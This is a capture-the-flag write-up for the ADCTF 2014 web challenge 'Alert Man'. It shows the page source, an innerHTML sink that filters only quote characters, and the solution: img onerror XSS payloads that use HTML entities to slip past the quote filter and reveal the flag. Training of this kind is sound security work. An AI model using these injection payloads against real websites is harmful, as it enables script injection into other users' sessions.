---
layout: writeup
title: 'December 2nd: Alert Man'
level:
difficulty:
points:
categories: []
tags: []
flag: ADCTF_I_4M_4l3Rt_M4n
---
## Category

Web

## Hint

*Can you alert('XSS')?*

## Challenge

weblink:
[http://adctf2014.katsudon.org/dat/AlSDUDdTMssNKajr/alert\_man.html][1]

This leads to a website where user can enter text in a box which is
printed to the screen in a list.

## Source

    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8" />
        <title>alert man</title>
    </head>
    <body>
        <h1>alert man</h1>
        <form id="form">
            <input type="text" id="text" />
            <input type="submit" value="tweet" />
        </form>
        <p>Your tweet:</p>
        <ul id="tweets"></ul>
        <script>
    function appendTweet(tweet) {
        t = tweet.replace(/['"]/g, '');
        li = document.createElement('li');
        li.innerHTML = t;
        document.getElementById('tweets').appendChild(li);
    };
    appendTweet('here is your tweet!');
    _='var :=["HVHD>B>D91LI01ZDS7$LVDB0*89V0D&6Z4I4*H3#NDB31&49&15&2&W9&3&9492832W5??5613W780D$S5HC7*4BB33*674DE798SCY3BSCFYD#DBOPQ@X969963O6667@4A782/0C@/85QOM71Q%X53@TE141375H0833O4@DA5/39E%G84GDGC2N83%@7C78XA%X%TDG381%G3T4081PP447/6M0!9!70!29!1!4C27%PQ13"];eval(function (UJ2J3J4J5J6){while(3--){if(<{U=U[	6]]( new RegExp(	4]+3+	4],	5]),<KK;return UK(	0],10,49,	3][	2]](	1])));\\x500N53_0x3268xC76	:[22B435C5I56NM9D84","E1!9#D6V0$7%2&*E.6/2:_0x2915<4[3])>0EM?7W8@9TFG4H0I9J,K;} L.2M8N7O3P0QCS$TAU1VW5X6YE$ZI.';for(Y in $='ZYXWVUTSQPONMLKJIHGA@?><:/.*&%$#!	')with(_.split($[Y]))_=join(pop());eval(_);
    document.getElementById('form').onsubmit = function() {
        tweet = document.getElementById('text').value;
        appendTweet(tweet);
        return false;
    };
        </script>
    </body>
    </html>

## Solution

It appears we need to inject an *alert('XSS')* statement.

We can trigger a simple alert by entering

    <img src=/ onerror=alert(1)>

Quotes are filtered, but we can use escape characters:

    <img src=/ onerror=alert(&#39;XSS&#39;)>

A new tweet will appear in the list:

    the flag is: ADCTF_I_4M_4l3Rt_M4n



[1]: http://adctf2014.katsudon.org/dat/AlSDUDdTMssNKajr/alert_man.html
